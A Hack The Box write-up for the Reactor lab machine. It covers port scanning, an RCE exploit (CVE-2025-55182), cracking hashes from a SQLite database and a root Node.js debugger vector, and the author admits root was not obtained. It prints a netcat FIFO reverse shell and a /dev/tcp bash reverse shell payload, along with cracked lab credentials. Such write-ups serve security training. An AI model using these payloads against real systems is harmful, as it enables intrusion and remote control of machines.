# Reactor - Hack The Box Writeup

## Introduction
**Reactor** is an easy-difficulty Linux machine on Hack The Box. Initial access is obtained by exploiting a Remote Code Execution (RCE) vulnerability (CVE-2025-55182) in the **ReactorWatch Core Monitoring System v3.2.1** running on port 3000. Lateral movement involves extracting password hashes from a local SQLite database (`reactor.db`) and cracking the MD5 hash for the user `engineer` to establish an interactive SSH session. Privilege escalation centers around a local Node.js process listening on port 9229 with the inspector/debugger enabled, which executes under `root` privileges.

> [!NOTE]
> **Assessment Retrospective & Learning Note:**
> While the privilege escalation vector was successfully identified via the Node.js debugger listening locally as root, the root flag was not captured during the live assessment. Interacting with and successfully executing commands through the debugger session presented technical roadblocks that exceeded my knowledge at the time. Documenting this writeup transparently reflects an honest approach to continuous learning, identifying specific gaps in Node.js runtime debugging and socket exploitation to master in future practice.

### Attack Summary Table
| Metric / Phase | Details |
| --- | --- |
| **Target IP** | `10.129.1.50` (Reconnaissance) / `10.129.1.198` (SSH) |
| **OS** | Linux |
| **Initial Access** | Remote Code Execution (CVE-2025-55182) in ReactorWatch v3.2.1 |
| **Lateral Movement** | SQLite (`reactor.db`) Hash Dump -> Hashcat MD5 Cracking (`reactor1`) -> SSH (`engineer`) |
| **Privilege Escalation** | Node.js Debugger on Port 9229 (Identified vector / Flag not captured) |

---

## Reconnaissance

### Port Scanning
An initial network scan was conducted to identify open TCP ports and running services on the target:

```bash
nmap -Pn -sC -sV 10.129.1.50 -oN fast_scan
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH
3000/tcp open  ppp     ReactorWatch Core Monitoring System
```

---

## Initial Access

### Web Enumeration & Application Fingerprinting
Navigating to `http://10.129.1.50:3000` revealed the dashboard for the monitoring application, exposing the exact software banner:

```text
REACTORWATCH
CORE MONITORING SYSTEM v3.2.1
```

### Remote Code Execution (CVE-2025-55182)
Vulnerability research for ReactorWatch v3.2.1 uncovered **CVE-2025-55182**, an unauthenticated Remote Code Execution flaw. A public proof-of-concept exploit was obtained:
* **Exploit Reference:** `https://github.com/msanft/CVE-2025-55182/blob/main/poc.py`

The exploit script accepts the target base URL and an executable payload parameter:

```python
BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"
```

To establish an interactive reverse shell, a local Netcat listener was started:

```bash
nc -nlvp 4444
```

The payload parameter was replaced with a FIFO reverse shell command directed to the listener:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.105 4444 >/tmp/f
```

Triggering the exploit established an initial reverse shell on the listener.

---

## Lateral Movement

### SQLite Database Inspection
During local post-exploitation enumeration, an SQLite database file was discovered in `/opt/reactor-app`:

```bash
ls -la /opt/reactor-app
```

Connecting to the database using `sqlite3` allowed enumerating the schema and dumping user records from the `users` table:

```bash
sqlite3 /opt/reactor-app/reactor.db
```

```sql
.tables
SELECT * FROM users;
```

```text
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

### Hash Cracking with Hashcat
The password hash for `engineer` (`39d97110eafe2a9a68639812cd271e8e`) is a 32-character hexadecimal string representing an **MD5** algorithm. Hashcat was invoked using mode `0` (`MD5`) against `rockyou.txt`:

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

```text
39d97110eafe2a9a68639812cd271e8e:reactor1
```

* **Username:** `engineer`
* **Plaintext Password:** `reactor1`

### SSH Access as Engineer
Using the recovered credentials, SSH authentication succeeded for the user `engineer`:

```bash
ssh engineer@10.129.1.198
```

---

## Privilege Escalation

### Local Port & Process Enumeration
Once logged in as `engineer`, internal network listeners were inspected to identify services restricted to localhost:

```bash
ss -tulnp
```

```text
tcp  LISTEN  0  511  127.0.0.1:9229  0.0.0.0:*
```

Port `9229` is the standard port for the **Node.js V8 inspector / debugger protocol**. Checking active system processes confirmed that the debugger instance is executed by the `root` user:

```bash
ps aux | grep node
```

```text
node        1414  0.0  2.6 11812532 103412 ?     Ssl  12:48   0:02 next-server (v15.0.3)
root        1416  0.0  1.2 1067180 49764 ?       Ssl  12:48   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

### Node.js Debugger Exploitation Vector
Because the inspector runs as `root` without authentication on `127.0.0.1:9229`, connecting to it enables arbitrary JavaScript evaluation in the context of the root process:

```bash
node inspect 127.0.0.1:9229
```

From within the interactive debugger console, child process execution can theoretically be triggered using Node's `child_process` module:

```javascript
exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
```

Alternatively, a secondary reverse shell can be attempted:

```javascript
exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.130/9002 0>&1\"').toString()")
```

### Retrospective & Roadblock
Although the root-level Node.js debugger vector was successfully identified, stabilizing the debugger session and obtaining confirmation of the root flag could not be achieved during this live run. Rather than presenting theoretical steps as a complete compromise, acknowledging this stopping point highlights key technical takeaways:
1. **Node.js Inspector Mechanics:** Deepening understanding of the Chrome DevTools Protocol / V8 inspector command execution and payload reliability.
2. **Environment Constraints:** Investigating why certain execution wrappers hang or fail under non-standard TTY environments.
3. **Commitment to Integrity:** Sincerity regarding assessment results builds a stronger foundation for technical growth and professional penetration testing standards.
